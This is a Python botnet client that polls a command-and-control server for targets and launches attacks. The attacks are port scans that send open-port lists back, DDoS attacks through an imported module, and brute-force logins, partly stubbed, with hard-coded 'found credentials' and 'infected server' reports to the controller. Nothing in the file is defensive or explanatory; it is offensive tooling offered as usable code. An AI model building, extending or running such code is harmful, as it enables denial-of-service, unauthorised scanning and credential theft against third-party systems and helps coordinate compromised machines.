import requests
import socket
import time
import threading
import socket

from ddos import ddos

BASE_URL = "base.url"

def add_target(ip, attack_type, port=None, priority=1):
    url = f"{BASE_URL}/add_target"
    data = {
        "ip": ip,
        "type": attack_type,
        "port": port,
        "priority": priority
    }
    response = requests.post(url, json=data)
    return response.json()

def submit_results(data):
    url = f"{BASE_URL}/submit_results"
    response = requests.post(url, json=data)
    return response.json()

def get_target():
    url = f"{BASE_URL}/get_target"
    response = requests.get(url)
    return response.json()

def notify_credentials_found(ip, username, password):
    url = f"{BASE_URL}/notify_credentials_found"
    data = {
        "credentials": {
            "ip": ip,
            "username": username,
            "password": password
        }
    }
    response = requests.post(url, json=data)
    return response.json()

def notify_infected_server(ip_address):
    url = f"{BASE_URL}/notify_infected_server"
    data = {
        "ip_address": ip_address
    }
    response = requests.post(url, json=data)
    return response.json()

def perform_port_scan(ip, start_port, end_port):
    open_ports = []
    for port in range(start_port, end_port + 1):
        try:
            # Create a socket object
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)

            # Check if the port is open
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)

            sock.close()
        except Exception as e:
            print(f"Error during port scan: {str(e)}")

    # Send results back to the server
    results_data = {"ip": ip, "open_ports": open_ports}
    submit_results(results_data)
    return open_ports

def perform_ddos_attack(ip):
    # Implement your DDoS attack logic here
    print(f"Performing DDoS attack on {ip}")



def perform_ddos_attack(target_ip, target_port=80, additional_info={}):
    ssl = additional_info.get("ssl", False)

    method = additional_info.get("method", None)
    
    ddos(target_ip, target_port, ssl, method)


def perform_bruteforce_attack(ip, username, password_list):
    # Implement your bruteforce attack logic here
    print(f"Performing bruteforce attack on {ip} with username {username} and password list {password_list}")

def perform_aggressive_bruteforce_attack(ip):
    # Implement your aggressive bruteforce attack logic here
    print(f"Performing aggressive bruteforce attack on {ip}")

# Example usage
while True:
    # Retrieve a target from the server
    target_response = get_target()
    if target_response.get("ip"):
        target_ip = target_response["ip"]
        target_type = target_response["type"]
        target_port = target_response["port"]
        target_priority = target_response["priority"]
        additional_info = target_response["additional_info"]

        print(f"Received target: IP - {target_ip}, Type - {target_type}, Port - {target_port}, Priority - {target_priority}")

        # Simulate adding the target to the attack list
        add_target(target_ip, target_type, target_port, target_priority)

        # Determine the attack type and call the corresponding function
        if target_type == 0:
            available_ports = perform_port_scan(target_ip, 1, 1024)
            print(f"Available ports: {available_ports}")
        elif target_type == 1:
            perform_ddos_attack(target_ip, target_port, additional_info)
        elif target_type == 2:
            perform_bruteforce_attack(target_ip, "admin", ["password123", "admin123"])
        elif target_type == 3:
            perform_aggressive_bruteforce_attack(target_ip)

        # Simulate finding credentials and notifying the server
        notify_credentials_found(target_ip, "admin", "password123")

        # Simulate notifying the server about an infected server
        notify_infected_server(target_ip)

    # Sleep for a while before the next iteration
    time.sleep(60)  # Sleep for 60 seconds before the next iteration
